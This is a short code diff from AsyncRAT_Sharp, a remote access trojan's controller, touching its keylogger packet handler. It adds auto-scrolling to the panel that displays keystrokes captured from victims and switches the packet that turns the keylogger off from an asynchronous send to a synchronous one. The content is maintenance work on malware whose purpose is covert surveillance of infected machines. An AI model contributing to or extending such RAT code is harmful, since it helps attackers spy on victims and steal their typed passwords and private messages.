@@ -23,13 +23,15 @@ namespace AsyncRAT_Sharp.Handle_Packet
                         if (KL != null)
                         {
                             KL.richTextBox1.AppendText(unpack_msgpack.ForcePathObject("Log").GetAsString());
+                            KL.richTextBox1.SelectionStart = KL.richTextBox1.TextLength;
+                            KL.richTextBox1.ScrollToCaret();
                         }
                         else
                         {
                             MsgPack msgpack = new MsgPack();
                             msgpack.ForcePathObject("Packet").AsString = "keyLogger";
                             msgpack.ForcePathObject("isON").AsString = "false";
-                            client.BeginSend(msgpack.Encode2Bytes());
+                            client.Send(msgpack.Encode2Bytes());
                         }
                     }));
                 }
